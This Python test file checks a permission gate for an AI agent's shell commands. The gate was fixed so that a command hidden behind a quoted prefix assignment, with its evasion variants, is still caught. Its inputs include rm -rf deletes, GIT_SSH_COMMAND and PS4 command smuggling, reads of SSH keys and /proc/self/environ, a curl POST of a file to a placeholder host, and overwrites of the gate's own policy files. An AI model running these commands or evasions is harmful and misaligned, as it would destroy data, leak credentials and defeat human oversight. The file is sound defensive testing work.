"""A quoted prefix assignment no longer hides the command after it, and an unknown program beside a
logged part asks (#471).

Bash reads `X='a b' cmd` as an assignment and runs cmd: only the value is quoted. The gate kept any
quoted assignment word as the program, an unknown one, so cmd was never read. Beside a push that
logs, that unknown program's ask was dropped too, since the opaque floor fired only on `indirection`.
A word is now an assignment when its NAME= is unquoted in the source, and the floor fires on an
unknown program as well. Classification and decision only; nothing is executed.
"""
from collections import Counter
from dataclasses import replace

import pytest

from exo.gate import (CATEGORIES, OUTCOMES, binds_exact, call_approvers, classify, decide, no_grant,
                      normalize_approvals, normalize_policies, readings)

DEFAULT = normalize_policies(None)
DENY = normalize_policies({"gates": {"deny": ["delete"]}})
POSTING = normalize_policies({"gates": {"scopes": {"internal": ["myorg/*"]}},
                              "posting": {"footer": "F", "forbid_words": ["Zork"]}})
R = "-R myorg/app"
CLEAN = f"gh pr comment 5 {R} --body $'ok\\nF'"
DIRTY = f"gh pr comment 6 {R} --body 'Zork leaked'"
PUSH = "git push origin feature"
RM = "rm -rf /srv/data"

# Each spelling bash reads as the assignment X=... before the command.
# A line continuation inside the name is no quoting: bash drops it first, so `X\\<newline>=` is X=.
# bash reads a subscript prefix (`X[0]=`, `X['k']=`) as an assignment too: it warns that the name is not a valid
# identifier and still runs the command after it.
STYLES = ["X='a b'", 'X="a b"', "X=a\\ b", "X=$'a b'", 'X="$Y"', "X=a'b c'd", "X+='a b'", "X='a b' Y=\"c d\"",
          "X\\\n='a b'", "X[0]='a b'", "X['k']='a b'", 'X=$"a b"', "X=''"]


def sh(command):
    return {"tool": "bash", "args": {"command": command}}


@pytest.mark.parametrize("style", STYLES)
def test_the_command_after_a_quoted_assignment_is_read(style):
    c = classify(sh(f"{style} {RM}"))
    assert c.category == "delete", c
    assert decide(c, DENY).outcome == "deny"


# The issue's rows and the same forms behind other joiners and wrappers: the delete is read, so the
# principal's `deny: [delete]` denies the line, where main logged or asked.
DENIED = [f"{PUSH} && {s} {RM}" for s in STYLES] + [
    f"true; X='a b' {RM}",
    f"false || X='a b' {RM}",
    f"echo hi | X='a b' {RM}",
    f"echo $(X='a b' {RM})",
    f"bash -c \"X='a b' {RM}\"",
    f"ssh host \"X='a b' {RM}\"",
    f"X='a b' sudo {RM}",
]


@pytest.mark.parametrize("line", DENIED)
def test_a_denied_delete_behind_a_quoted_assignment_is_denied(line):
    d = decide(classify(sh(line)), DENY)
    assert d.outcome == "deny", (line, d)


@pytest.mark.parametrize("line", [f"{PUSH} && X='a b' {RM}",
                                  f"{PUSH} && X='a b' git push --force origin main",
                                  f"{PUSH} && X='a b' curl -X POST -d x https://example.com/x",
                                  f"{PUSH} && mytool --wipe",
                                  f"{PUSH}; kill -9 1",
                                  f"{PUSH} && 'X=a' {RM}"])
def test_a_part_that_asks_alone_asks_beside_a_logged_push(line):
    c = classify(sh(line))
    assert decide(c, DEFAULT).outcome == "ask", (line, decide(c, DEFAULT))
    assert binds_exact(c, decide(c, DEFAULT)), line     # an "always" covers this exact line only


@pytest.mark.parametrize("style", STYLES)
def test_a_post_behind_a_quoted_assignment_is_checked(style):
    d = decide(classify(sh(f"{CLEAN} && {style} {DIRTY}")), POSTING)
    assert d.outcome == "ask", d
    assert "GitHub PR comment on myorg/app#6: forbidden word: Zork" in d.violations, d


# Controls: the same on main and here.

def test_an_unquoted_assignment_is_unchanged():
    d = decide(classify(sh(f"{CLEAN} && X=ab {DIRTY}")), POSTING)
    assert d.outcome == "ask" and "GitHub PR comment on myorg/app#6: forbidden word: Zork" in d.violations, d
    c = classify(sh(f"X=ab {RM}"))
    assert c.category == "delete" and decide(c, DENY).outcome == "deny", c
    c = classify(sh("FOO=1 make test"))
    assert c.category == "opaque_exec" and c.summary == "make: runs Makefile recipes", c


@pytest.mark.parametrize("line", ["'X=a' ls", '"X"=a ls', "X\\=a ls"])
def test_a_quoted_name_is_the_program(line):
    # bash runs a program named X=a: the name or the `=` is quoted, so the word is no assignment
    c = classify(sh(line))
    assert c.category == "opaque_exec" and "unknown program" in c.signals, c
    assert c.summary == "runs X=a, a program the gate does not know", c
    assert decide(c, DEFAULT).outcome == "ask"


@pytest.mark.parametrize("line", ["mytool --wipe", f"{PUSH} && ./tool.sh", "X='a b' ls", "X='a b'",
                                  "PATH='/tmp/x' ls", "'PATH=/tmp/x' ls", "GIT_SSH_COMMAND='evil' git fetch"])
def test_these_ask_as_before(line):
    c = classify(sh(line))
    assert decide(c, DEFAULT).outcome == "ask", (line, decide(c, DEFAULT))


def test_naming_opaque_exec_still_lowers_an_unknown_program():
    for pol in ({"gates": {"categories": {"opaque_exec": "log"}}},
                {"gates": {"rules": [{"match": {"category": "opaque_exec"}, "decision": "log", "reason": "ok"}]}}):
        d = decide(classify(sh("mytool --wipe")), normalize_policies(pol))
        assert d.outcome == "log", (pol, d)
    d = decide(classify(sh(f"{PUSH} && mytool --wipe")),
               normalize_policies({"gates": {"categories": {"opaque_exec": "log"}}}))
    assert d.outcome == "log", d
    # a rule on opaque_exec lowers it only when the rule matches the line's dominant part, as for `indirection`
    d = decide(classify(sh(f"{PUSH} && mytool --wipe")), normalize_policies(
        {"gates": {"rules": [{"match": {"category": "opaque_exec"}, "decision": "log", "reason": "ok"}]}}))
    assert d.outcome == "ask", d


@pytest.mark.parametrize("style", STYLES)
@pytest.mark.parametrize("policy, outcome", [
    ({"gates": {"categories": {c: "allow" for c in CATEGORIES}}}, "ask"),
    ({"gates": {"categories": {c: "log" for c in CATEGORIES}}}, "ask"),
    ({"gates": {"matrix": {"irreversible": {"public": "deny", "internal": "deny"}, "costly": {"public": "deny"}}}},
     "deny"),
])
def test_the_line_is_also_decided_as_before(style, policy, outcome):
    # The delete now outranks the post, but the matrix cell, category lines and third-party escalation read only the
    # dominant part (#437). The line is also decided with the post on top, as main decided it, and the stricter stands.
    line = f"gh pr comment 5 -R myorg/app --body $'ok\\nF' && {style} {RM}"
    d = decide(classify(sh(line)), normalize_policies(policy))
    assert d.outcome == outcome, (line, policy, d)


STORE = '"$HOME/.exo/state/notes.md"'
SECRET = '"$HOME/.ssh/id_rsa"'


@pytest.mark.parametrize("line", [f"X={STORE} ls", f"X={STORE}; echo x > \"$X\"", "X='~/.exo/state/notes.md' ls",
                                  f"cd ~/.exo/state && X={STORE} ls", f"{PUSH} && X={STORE} ls"])
def test_a_store_path_in_a_quoted_value_is_still_a_store_write(line):
    # main read the quoted word as an argument and found the store path in it; the word is still scanned
    c = classify(sh(line))
    assert c.category == "store_write", (line, c)
    assert decide(c, normalize_policies({"gates": {"deny": ["store_write"]}})).outcome == "deny", line
    d = decide(c, normalize_policies({"gates": {"categories": {"opaque_exec": "allow"}}}))
    assert d.outcome == "ask", (line, d)


def test_a_store_path_set_for_a_later_command_still_asks():
    d = decide(classify(sh(f"f={STORE}; cp /tmp/evil \"$f\"")),
               normalize_policies({"gates": {"categories": {"opaque_exec": "allow"}}}))
    assert d.outcome == "ask", d


@pytest.mark.parametrize("line", [f"X={SECRET} ls", "X='~/.ssh/id_rsa' cat", f"{PUSH} && X={SECRET} ls"])
def test_a_secret_path_in_a_quoted_value_is_still_credentials(line):
    c = classify(sh(line))
    assert c.category == "credentials", (line, c)
    assert decide(c, normalize_policies({"gates": {"deny": ["credentials"]}})).outcome == "deny", line


# An `env -S` behind the quoted word ends the new reading there (its text is read as a line and as env's argv, #591),
# but main read the quoted word as the program: its value was scanned for store paths and env-inject names. Both
# still are.
STORE_ENV_S = [f"X={STORE} env -S 'ls'", "X='~/.exo/state/notes.md' env -S 'ls'", f"X={STORE} sudo env -S 'ls'",
               f"X={STORE} env --split-string='ls'", f"X={STORE} env -S'ls'", f"{PUSH} && X={STORE} env -S 'ls'"]


@pytest.mark.parametrize("line", STORE_ENV_S)
def test_a_store_path_in_a_quoted_value_before_env_s_still_counts(line):
    c = classify(sh(line))
    assert decide(c, normalize_policies({"gates": {"deny": ["store_write"]}})).outcome == "deny", (line, c)
    d = decide(c, normalize_policies({"gates": {"categories": {"opaque_exec": "allow"}}}))
    assert d.outcome == "ask", (line, d)


INJECT_ENV_S = ["GIT_SSH_COMMAND='rm -rf /srv/data' env -S 'git fetch'",
                "GIT_SSH_COMMAND=rm\\ -rf\\ /srv/data env -S 'git fetch'",
                "PS4='$(rm -rf /srv/data)' env -S 'bash -x s.sh'",
                f"{PUSH} && GIT_SSH_COMMAND='rm -rf /srv/data' env -S 'git fetch'",
                f"{PUSH} && PS4='$(rm -rf /srv/data)' env -S 'bash -x s.sh'"]


@pytest.mark.parametrize("line", INJECT_ENV_S)
def test_an_env_inject_value_before_env_s_is_still_read(line):
    c = classify(sh(line))
    assert decide(c, DENY).outcome == "deny", (line, c)
    d = decide(c, normalize_policies({"gates": {"categories": {"opaque_exec": "allow"}}}))
    assert d.outcome == "ask", (line, d)


@pytest.mark.parametrize("line, outcome", [('X="$Y" ls; git push --force origin main', "ask"),
                                           ('X="$Y" ls; git push origin feature', "log"),
                                           ('X="$(id)" ls; git push origin feature', "log")])
def test_a_dynamic_quoted_assignment_word_is_still_a_setter(line, outcome):
    # main read `X="$Y"` as a program from a variable, which may change the shell for the push after it, so a rule on
    # `git push` that would lower the line must name that command too (#394). It still counts.
    pol = normalize_policies({"gates": {"categories": {"opaque_exec": "allow"},
                                        "rules": [{"match": {"command": "git push"}, "decision": "allow",
                                                   "reason": "r"}]}})
    d = decide(classify(sh(line)), pol)
    assert d.outcome == outcome, (line, d)


MATRIX_DENY = normalize_policies({"gates": {"matrix": {"irreversible": {"public": "deny", "internal": "deny"},
                                                       "costly": {"public": "deny"}}}})


@pytest.mark.parametrize("value", [f"declare -a 'arr=($({RM}))'", f"declare -i 'x=a[$({RM})]'",
                                   f"declare -A 'm=([k]=$({RM}))'"])
def test_a_value_read_again_behind_a_quoted_assignment_is_decided_as_before(value):
    # declare reads the value again, and the delete in it is added to the line late; the post on top before still
    # decides the line too
    line = f"{CLEAN} && X='a b' {value}"
    d = decide(classify(sh(line)), MATRIX_DENY)
    assert d.outcome == "deny", (line, d)


@pytest.mark.parametrize("line", ["X='a b' cd /proc && cat self/environ", "X='a b' cd /proc/self && cat environ",
                                  "X='a b' cd ~/.exo && mv keys /tmp/k", "X='a b' cd /dev && tar czfC - ~/.kube config",
                                  "X='a b' coproc env | cat"])
def test_a_secret_read_after_a_quoted_assignment_is_still_denied(line):
    # the new reading of the quoted word (a `cd`, a `coproc`) gives a store write or another part on top, but the line
    # read as before, the word a program, reads the secret, and a deny on credentials still denies it
    c = classify(sh(line))
    assert decide(c, normalize_policies({"gates": {"deny": ["credentials"]}})).outcome == "deny", (line, c)
    allow_under_denies = {"gates": {"categories": {x: "deny" for x in ("delete", "force_push", "github_post",
                                                                         "vcs_push", "local_write", "opaque_exec",
                                                                         "web_post", "credentials", "web_read")},
                                    "rules": [{"match": {"command": ".*"}, "decision": "allow", "reason": "r"}]}}
    assert decide(c, normalize_policies(allow_under_denies)).outcome == "deny", (line, c)


def test_a_store_scan_reads_its_own_reading():
    # main read `X='a b'` as the program with the folder `cd /dev` left; the find's delete does not widen that scan
    d = decide(classify(sh("cd /dev && X='a b' find / -delete")),
               normalize_policies({"gates": {"deny": ["target:/dev*", "target:/proc*"]}}))
    assert d.outcome == "deny", d


@pytest.mark.parametrize("cmd", ["yarn publish", "git push --force origin main", f"gh pr comment 5 {R} --body hi",
                                 "ssh -vpls 22 rm -rf /data"])
def test_a_cd_behind_a_quoted_assignment_leaves_the_line_decided_as_before(cmd):
    # bash runs the cd, so the command after it is in /dev, a store write the gate cannot resolve that outranks it
    # (#437); main read the quoted word as the program, and the command after it decided the line. Both are decided.
    line = f"X='a b' cd /dev && {cmd}"
    c = classify(sh(line))
    assert decide(c, MATRIX_DENY).outcome == "deny", (line, decide(c, MATRIX_DENY))


def test_the_reading_as_before_is_kept_only_for_a_quoted_assignment():
    assert classify(sh("X=ab cd /dev && yarn publish")).before is None
    assert classify(sh("'X=a' ls")).before is None
    c = classify(sh("X='a b' cd /dev && yarn publish"))
    assert c.category == "store_write", c          # the cd is read: yarn runs in /dev
    assert c.before is not None and c.before.category == "publish", c.before
    assert "before" not in c.as_dict()


# gate_diff's posting policies. Two posts to one PR that both miss the footer list that violation twice, named after
# the post, once a `cd` or `pushd` into the store, a descriptor folder or a secret folder is on top (#468). The line
# read as before lists it twice; the stricter of both readings keeps each entry as often as either lists it (#439's
# merge), not once.
POSTING_POLICIES = {
    "posting_footer": normalize_policies({"posting": {"footer": "-- sent by an agent"}}),
    "posting_close_and_merge": normalize_policies({"posting": {
        "applies_to": ["github_post", "github_close", "vcs_merge", "message_send"], "footer": "-- bot",
        "forbid_words": ["done", "secret"]}}),
    "posting_footer_everywhere": normalize_policies({"gates": {"scopes": {"private": ["*"]}}, "posting": {
        "footer": "-- bot", "footer_exposures": ["private", "internal", "public"]}}),
}
MOVES = ["X='a b' pushd /dev/fd", "X=a\\ b cd ~/.exo/state", "X='a b' command cd ~/.exo/state", "X=a\\ b pushd ~/.ssh",
         "X=a\\ b command cd ~/.ssh", "X='a b' builtin cd ~/.ssh", 'X="$Y" cd /dev/fd',
         "X='a b' Y=\"c d\" pushd ~/.exo/state", "X='a b' cd $EXO_HOME/plugins", "X=a\\ b pushd /proc/self"]


def _kept(d, before):
    """Every violation and reserved part of the line decided as before is in ``d``, as often, and no lower."""
    assert OUTCOMES.index(d.outcome) >= OUTCOMES.index(before.outcome), (d, before)
    assert not Counter(before.violations) - Counter(d.violations), (d.violations, before.violations)
    assert set(before.reserved) <= set(d.reserved), (d.reserved, before.reserved)


@pytest.mark.parametrize("name", POSTING_POLICIES)
@pytest.mark.parametrize("move", MOVES)
def test_two_alike_violations_are_both_kept(name, move):
    pol = POSTING_POLICIES[name]
    line = f"{CLEAN} && {move} && gh pr comment 5 {R} --body hi"
    c = classify(sh(line))
    d = decide(c, pol)
    footer = pol["posting"]["footer"]
    assert d.outcome == "ask" and d.violations.count(f"GitHub PR comment on myorg/app#5: missing footer: {footer}") \
        == 2, (line, name, d)
    _kept(d, decide(c.before, pol))


@pytest.mark.parametrize("line", [
    f"{CLEAN} ; X='a b' cd ~/.exo/state ; gh pr comment 5 {R} --body hi ; git push --force origin main",
    f"{CLEAN} && echo $(X='a b' pushd /dev/fd && gh pr comment 5 {R} --body hi) && gh pr comment 5 {R} --body hi",
    f"{CLEAN} && bash -c 'X=a\\ b cd ~/.ssh && gh pr comment 5 {R} --body hi' && gh pr comment 5 {R} --body hi",
    f"{CLEAN} && for i in 1; do X='a b' cd ~/.exo/plugins && gh pr comment 5 {R} --body hi; done",
    f"gh pr comment 5 {R} --body 'secret done' && X='a b' cd /dev && gh pr merge 5 {R} --squash",
    "gh -R myorg/app pr comment 5 -b hi && X='a b' pushd ~/.exo/state && gh pr -R myorg/app comment 5 -b hi | cat",
])
@pytest.mark.parametrize("name", POSTING_POLICIES)
def test_the_line_decided_as_before_loses_nothing_in_the_merge(name, line):
    pol = POSTING_POLICIES[name]
    c = classify(sh(line))
    assert c.before is not None, line
    _kept(decide(c, pol), decide(c.before, pol))


# --- with a shell call's own folder (#311), store parts (#447), sudo writes (#454) and ssh stdin (#316) ---------------
# gate.readings lists the line read as before after the line's own readings, so no_grant, call_approvers and
# body_unseen read it as decide does.

DELEGATED = normalize_approvals({"approvers": {"default": ["principal", "seat:a"]}})


@pytest.fixture
def home(tmp_path, monkeypatch):
    monkeypatch.setenv("HOME", str(tmp_path / "home"))
    monkeypatch.setenv("EXO_HOME", str(tmp_path / "home" / ".exo"))


def test_each_reading_as_before_is_one_of_the_lines_readings():
    c = classify(sh(f"X='a b' cd /tmp && gh pr -b x comment 5 {R}"))
    assert c.before is not None and c.before.floor is not None, c
    assert readings(c)[-2:] == [c.before, c.before.floor] and c not in readings(c.before)


@pytest.mark.parametrize("line, policy", [
    ("X='a b' sudo rm -rf /srv/data > /tmp/f", DENY),                     # #454: a sudo write line
    ("echo 'rm -rf /data' | X='a b' ssh prod-db ssh inner", DENY),        # #316: the hop reads the text fed to ssh
    ("echo 'rm -rf /data' | ssh prod-db \"X='a b' ssh inner\"", DENY),
    (f"{PUSH} && X='a b' sudo echo hi > /etc/x", normalize_policies({"gates": {"categories": {"local_write": "ask"}}})),
])
def test_a_command_behind_a_quoted_assignment_is_read_with_mains_new_readings(line, policy):
    outcome = "deny" if policy is DENY else "ask"
    assert decide(classify(sh(line)), policy).outcome == outcome, line


def test_a_delete_behind_a_quoted_assignment_in_a_secret_folder_is_denied(home):
    c = classify({"tool": "bash", "args": {"command": "X='a b' rm -rf config", "cwd": "~/.kube"}})
    assert decide(c, DENY).outcome == "deny" and no_grant(c), c


# Controls: the same on main and here.

@pytest.mark.parametrize("line", ["X='a b' env; echo x > ~/.exo/policies/gates.yaml",
                                  "X='a b' cp ~/.ssh/id_rsa ~/.exo/policies/gates.yaml",
                                  "X='a b' cd ~/.exo/state && echo x > notes.md",
                                  "cd ~/.exo/state && X='a b' cd /tmp && echo x > notes.md",
                                  f"{PUSH} && X='a b' cp evil.yaml ~/.exo/policies/default.yaml"])
def test_a_store_write_beside_a_quoted_assignment_is_the_principals_alone(home, line):
    c = classify(sh(line))
    assert no_grant(c) and call_approvers(c, DELEGATED) == ["principal"], line
    assert decide(c, normalize_policies({"gates": {"deny": ["store_write"]}})).outcome == "deny", line


# A store name an expansion hides (#320), a quoted or split one, and the Exo home's config.json so hidden (D-074),
# written behind each quoted prefix style, after a push and behind sudo. Guard rows: main dcab371a counts each of
# them, and so does each reading here, the new one alone too (the prefix strip and the store glob both run on it).
HIDDEN_STORE = ["~/.exo/pol$(:)icies/gates.yaml", "~/.exo/$(printf policies)/default.yaml",
                "~/.exo/pol'icies'/gates.yaml", "~/.exo/polic${u}ies/gates.yaml", "~/.exo/con$(:)fig.json"]
STORE_DENY = normalize_policies({"gates": {"deny": ["store_write"]}})


@pytest.mark.parametrize("form", ["{} cp /tmp/x {}", f"{PUSH} && {{}} cp /tmp/x {{}}", "{} sudo cp /tmp/x {}"])
@pytest.mark.parametrize("name", HIDDEN_STORE)
@pytest.mark.parametrize("style", STYLES)
def test_a_hidden_store_name_behind_a_quoted_assignment_is_the_principals_alone(home, style, name, form):
    line = form.format(style, name)
    c = classify(sh(line))
    assert decide(c, DEFAULT).outcome == "ask" and decide(c, STORE_DENY).outcome == "deny", line
    assert no_grant(c) and call_approvers(c, DELEGATED) == ["principal"], line
    new = replace(c, before=None) if getattr(c, "before", None) is not None else c
    assert decide(new, STORE_DENY).outcome == "deny" and no_grant(new), line


def test_a_sudo_write_behind_a_quoted_assignment_keeps_its_write():
    c = classify(sh("X='a b' sudo echo hi > /etc/x"))
    assert decide(c, normalize_policies({"gates": {"deny": ["local_write"]}})).outcome == "deny", c
    d = decide(c, normalize_policies({"gates": {"reserved": ["local_write"]}}))
    assert d.outcome == "ask" and ("local_write", "/etc/x") in d.reserved, d


def test_a_secret_read_from_the_calls_folder_behind_a_quoted_assignment_asks(home):
    c = classify({"tool": "bash", "args": {"command": "X='a b' cat config", "cwd": "~/.kube"}})
    assert no_grant(c) and decide(c, normalize_policies({"gates": {"deny": ["credentials"]}})).outcome == "deny", c


# --- with main 15e60ddb's readings (review 5659099075 of #546) ------------------------------------------------------
# A `$` form's backslash-newline joined (#584, ``also``) and the Exo home's config.json read as an ordinary file
# (D-074, ``ordinary``), behind a quoted prefix. The line read as before #471 is main's line: it keeps each reading
# main makes of it, the new reading makes its own, and gate.readings lists them all, the ordinary reading's own
# reading as before #471 too.
MAIN_READINGS = [('echo "$\\\n(git push --force origin main)"', "also"), ('rm -rf "$\\\n{HOME}/srv"', "also"),
                 ("cp /tmp/x ~/.exo/config.json", "ordinary"), ("cp /tmp/x ~/.exo/con$\\\nfig.json", "also ordinary"),
                 ('cp /tmp/x "$\\\n{HOME}/.exo/config.json"', "also ordinary")]
MAIN_FORMS = ["{} {}", f"{PUSH} && {{}} {{}}"]
PREFIXES = ["X='a b'", 'X="$Y"', "X=a\\ b"]
PUSH_DENY = normalize_policies({"gates": {"deny": ["force_push", "vcs_push", "delete"]}})


@pytest.mark.parametrize("form", MAIN_FORMS)
@pytest.mark.parametrize("body, kept", MAIN_READINGS)
@pytest.mark.parametrize("style", PREFIXES)
def test_each_reading_main_makes_stays_beside_the_reading_as_before(home, style, body, kept, form):
    c = classify(sh(form.format(style, body)))
    rs = readings(c)
    for x in (c, c.before):
        assert all(getattr(x, name) is not None for name in kept.split()), (x, kept)
        assert all(any(r is e for e in rs) for r in readings(x)), x
    if c.ordinary is not None:
        assert c.ordinary.before is not None and any(c.ordinary.before is r for r in rs), c.ordinary
    # and the command is read: its store write or push is denied as alone (`rm -rf` was an unknown program's argument)
    assert decide(c, STORE_DENY if "fig.json" in body else PUSH_DENY).outcome == "deny", c


# Guard rows: main asks or denies each of these lines and binds an "always" to the exact line, and so does the line
# here, no lower than the line read as before. Two are this fix's: after a push, main logs the delete behind
# `X='a b'` or `X=a\ b`, as an unknown program beside a push that logs.
@pytest.mark.parametrize("form", MAIN_FORMS)
@pytest.mark.parametrize("body, kept", MAIN_READINGS)
@pytest.mark.parametrize("style", PREFIXES)
def test_a_line_with_mains_readings_behind_a_quoted_assignment_decides_and_binds_as_on_main(home, style, body, kept,
                                                                                         form):
    c = classify(sh(form.format(style, body)))
    for pol in (DEFAULT, STORE_DENY, PUSH_DENY):
        d = decide(c, pol)
        assert binds_exact(c, d) and d.outcome in ("ask", "deny"), (pol, d)
        if getattr(c, "before", None) is not None:
            _kept(d, decide(c.before, pol))
    assert no_grant(c) == ("fig.json" in body), c


# Each store path a write names is a target (#514): guard rows, main denies them too. An ssh host stands for an
# empty target (#493): main read the quoted word as the program and never saw the host, so a rule on it missed.
@pytest.mark.parametrize("style", PREFIXES)
@pytest.mark.parametrize("line, gates", [
    ("{} cp ~/.exo/policies/a.yaml ~/.exo/policies/gates.yaml", {"deny": ["target:*/gates.yaml"]}),
    ("{} tee ~/.exo/policies/a.yaml ~/.exo/policies/gates.yaml", {"deny": ["target:*/gates.yaml"]}),
    ("{} ssh buildhost gh pr view 5", {"rules": [{"match": {"target": "buildhost"}, "decision": "deny"}]}),
    ("{} ssh -i ~/.ssh/k build gh repo view --web myorg/app",
     {"rules": [{"match": {"category": "read", "target": "build"}, "decision": "deny"}]}),
])
def test_mains_later_targets_reach_the_command_behind_a_quoted_assignment(home, style, line, gates):
    c = classify(sh(line.format(style)))
    pol = normalize_policies({"gates": gates})
    d = decide(c, pol)
    assert d.outcome == "deny" and binds_exact(c, d), (line, d)
    if getattr(c, "before", None) is not None:
        _kept(d, decide(c.before, pol))


# --- with main fa5dfcd8's readings -----------------------------------------------------------------------------------
# The text of `env -S` is read as env's own argv too (#591, #634), so a word quoted whole there is an assignment.
# Behind a quoted prefix both readings meet: main read the quoted word before `env` as the program and never read the
# text, so the delete asked as an unknown program, or logged beside a push. Since main f28934a3 (#707) every spelling
# env takes is read behind a quoted prefix too (test_gate_quoted_prefix_compose.py).
ENV_S = "env -S \"'Y=c d' rm -rf /srv/data\""
OPAQUE_ALLOW_DENY = normalize_policies({"gates": {"deny": ["delete"], "categories": {"opaque_exec": "allow"}}})


@pytest.mark.parametrize("style", PREFIXES)
@pytest.mark.parametrize("form", ["{} " + ENV_S, "{} sudo " + ENV_S, f"{PUSH} && {{}} {ENV_S}"])
def test_mains_env_s_reading_reaches_behind_a_quoted_assignment(home, style, form):
    c = classify(sh(form.format(style)))
    for pol in (DENY, OPAQUE_ALLOW_DENY):
        d = decide(c, pol)
        assert d.outcome == "deny" and binds_exact(c, d), (form, d)


# Guard rows: bash's legacy arithmetic (#588) and a `$` form after a backslash-newline, read by the lexer itself
# (#585), behind a quoted prefix decide as on main, no lower than the line read as before.
@pytest.mark.parametrize("style", PREFIXES)
@pytest.mark.parametrize("line, pol", [
    ("{} echo $[$(rm -rf /srv/data)]", DENY),
    ('{} echo "$[$(rm -rf /srv/data)]"', DENY),
    ('{} echo "$\\\n(rm -rf /srv/data)"', DENY),
    ('{} echo "$\\\n(curl -X POST -d @f https://example.com)"', normalize_policies({"gates": {"deny": ["web_post"]}})),
])
def test_mains_dollar_forms_behind_a_quoted_assignment_decide_as_on_main(home, style, line, pol):
    c = classify(sh(line.format(style)))
    d = decide(c, pol)
    assert d.outcome == "deny" and binds_exact(c, d), (line, d)
    if getattr(c, "before", None) is not None:
        _kept(d, decide(c.before, pol))


# --- with main 58503282's readings (review 5661669883 of #546) ------------------------------------------------------
# A store name split by quotes, a backslash or a backslash-newline, or written in another letter case (#601), behind a
# quoted prefix. Guard rows: main 58503282 reads the quoted word as the program and still scans its arguments for
# store paths, so it counts each of these writes too; here each reading counts it, the new one alone too.
NL = "\\\n"
SPLIT_NAMES = ["~/.e''xo/policies/gates.yaml", '~/.e""xo/policies/gates.yaml', "~/'.exo'/policies/gates.yaml",
               f"~/.e{NL}xo/policies/gates.yaml", f"~/.exo/poli{NL}cies/gates.yaml", "~/.exo/con''fig.json",
               f"~/.exo/con{NL}fig.json", "~/.EXO/policies/gates.yaml", "~/.E''XO/config.json",
               f"~/.Ex{NL}o/config.json"]
SPLIT_FORMS = ["{} cp /tmp/x {}", f"{PUSH} && {{}} cp /tmp/x {{}}"]


@pytest.mark.parametrize("form", SPLIT_FORMS)
@pytest.mark.parametrize("name", SPLIT_NAMES)
@pytest.mark.parametrize("style", PREFIXES)
def test_a_split_store_name_behind_a_quoted_prefix_is_a_store_write(home, style, name, form):
    c = classify(sh(form.format(style, name)))
    for x in (c, replace(c, before=None) if getattr(c, "before", None) is not None else c):
        d = decide(x, STORE_DENY)
        assert d.outcome == "deny" and binds_exact(x, d) and no_grant(x), (x, d)
    assert decide(c, DEFAULT).outcome == "ask" and call_approvers(c, DELEGATED) == ["principal"], c


# Fix rows: a `cd` behind a quoted prefix into the store folder, its name split by quotes, a backslash or a
# backslash-newline or in another letter case, then a write there by a relative name. Main 58503282 reads the quoted
# word as the program and never moves the folder, so the write is `cp` to a `config.json` of the session's folder,
# the line is `credentials` (the store folder is read as an argument) and `deny: [store_write]` asks. Bash runs the
# `cd`, so the write lands on the home's config.json: a store write here, which that entry denies.
SPLIT_DIRS = ["~/.e''xo", '~/.e""xo', "~/'.exo'", "~/.e\\xo", f"~/.e{NL}xo", "~/.EXO", f"~/.Ex{NL}o"]
CD_WRITE = "cd {} && cp /tmp/x config.json"


@pytest.mark.parametrize("form", ["{} " + CD_WRITE, f"{PUSH} && {{}} {CD_WRITE}"])
@pytest.mark.parametrize("folder", SPLIT_DIRS)
@pytest.mark.parametrize("style", PREFIXES)
def test_a_cd_into_a_split_store_folder_behind_a_quoted_prefix_keeps_its_store_write(home, style, folder, form):
    c = classify(sh(form.format(style, folder)))
    d = decide(c, STORE_DENY)
    assert d.outcome == "deny" and binds_exact(c, d) and no_grant(c), (c, d)
    assert call_approvers(c, DELEGATED) == ["principal"], c
    if getattr(c, "before", None) is not None:
        _kept(d, decide(c.before, STORE_DENY))


# Guard rows: main's other readings behind a quoted prefix. A `$((` bash reads as a command substitution (#553), a
# secret name in another letter case (#601) and a glob in a secret store's folder (#594) decide as on main, no lower
# than the line read as before, and bind an "always" to the exact line.
CRED_DENY = normalize_policies({"gates": {"deny": ["credentials"]}})


@pytest.mark.parametrize("form", ["{} {}", f"{PUSH} && {{}} {{}}"])
@pytest.mark.parametrize("body, pol", [
    ("echo $((echo '((' ; git push --force origin main) )", PUSH_DENY),
    ("echo $((echo '((' ; rm -rf /srv/data) )", DENY),
    ("echo x > ~/.KUBE/config", CRED_DENY),
    ("cat ~/.SSH/config", CRED_DENY),
    ("cat ~/.ss?/*", CRED_DENY),
])
@pytest.mark.parametrize("style", PREFIXES)
def test_mains_later_readings_behind_a_quoted_prefix_decide_and_bind_as_on_main(home, style, body, pol, form):
    c = classify(sh(form.format(style, body)))
    d = decide(c, pol)
    assert d.outcome == "deny" and binds_exact(c, d), (c, d)
    assert decide(c, DEFAULT).outcome == "ask" and binds_exact(c, decide(c, DEFAULT)), c
    if getattr(c, "before", None) is not None:
        _kept(d, decide(c.before, pol))


# A camelCase tool keeps its unsplit name's reading as its ``floor`` (#515). That reading is made only for a tool the
# gate reads by its name and arguments, and the reading as before #471 only for a line the gate reads as a shell line,
# so no call has both: a quoted prefix line in such a tool's arguments is no shell line, and the call keeps main's
# floor, its decision and its binding. Guard rows: the same on main 58503282.
UNKNOWN_DENY = normalize_policies({"gates": {"categories": {"unknown": "deny"}}})
UNKNOWN_ASK = normalize_policies({"gates": {"categories": {"unknown": "ask"}}})


@pytest.mark.parametrize("tool, args, pols", [
    ("writeFile", {"path": "~/.exo/config.json", "content": f"X='a b' {RM}"}, (DEFAULT, STORE_DENY)),
    ("searchReplace", {"path": "~/.exo/policies/gates.yaml", "search": "X='a b'", "replace": RM},
     (DEFAULT, STORE_DENY)),
    ("runShellCommand", {"command": f"X='a b' {RM}"}, (UNKNOWN_ASK, UNKNOWN_DENY)),
    ("execCommand", {"command": "X='a b' cp /tmp/x ~/.exo/config.json"}, (UNKNOWN_ASK, UNKNOWN_DENY)),
])
def test_a_camelcase_tool_with_a_quoted_prefix_line_keeps_its_floor_and_binding(home, tool, args, pols):
    c = classify({"tool": tool, "args": args})
    assert c.floor is not None and getattr(c, "before", None) is None, c
    assert [decide(c, p).outcome for p in pols] == ["ask", "deny"], c
    assert all(binds_exact(c, decide(c, p)) for p in pols), c
    assert no_grant(c) == (tool in ("writeFile", "searchReplace")), c
